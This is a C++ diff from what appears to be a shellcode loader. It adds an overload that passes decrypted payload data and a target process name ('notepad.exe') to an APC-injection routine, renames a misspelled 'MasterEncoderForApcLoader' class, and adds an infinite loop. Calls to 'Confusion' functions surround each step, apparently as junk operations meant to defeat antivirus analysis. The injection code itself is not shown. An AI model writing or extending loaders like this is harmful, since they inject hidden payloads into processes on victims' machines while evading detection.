@@ -117,8 +117,11 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
     } else if (function_mode == "2") {
         Confusion::generateAndSortArray();
         this->printMode("Function 2");
-        this->startBase(MasterEncoderForApcLoadder::function1, decryptedData, byteLength);
+        this->startBase(MasterEncoderForApcLoader::function1, decryptedData, byteLength, "notepad.exe");
         Confusion::generateAndSortArray();
+        while (true){
+
+        }
     }else if (function_mode == "3") {
         Confusion::generateAndSortArray();
         this->printMode("Function 3");
@@ -135,12 +138,24 @@ void Launch::printMode(const string &mode) {
 }
 
 void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
-    MasterEncoderForApcLoadder::generateAndSortArray();
+    MasterEncoderForApcLoader::generateAndSortArray();
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
     startFunction(decryptedData, byteLength);
     Confusion::generateAndSortArray();
     Confusion::generateAndTransformArray();
-    MasterEncoderForApcLoadder::generateAndSortArray();
+    MasterEncoderForApcLoader::generateAndSortArray();
 
 }
+
+void Launch::startBase(startFunction2 startFunction, const unsigned char *decryptedData, size_t &byteLength,
+                       const string &name) {
+    MasterEncoderForApcLoader::generateAndSortArray();
+    Confusion::generateAndSortArray();
+    Confusion::generateAndTransformArray();
+    startFunction(decryptedData, byteLength, name);
+    Confusion::generateAndSortArray();
+    Confusion::generateAndTransformArray();
+    MasterEncoderForApcLoader::generateAndSortArray();
+}
+
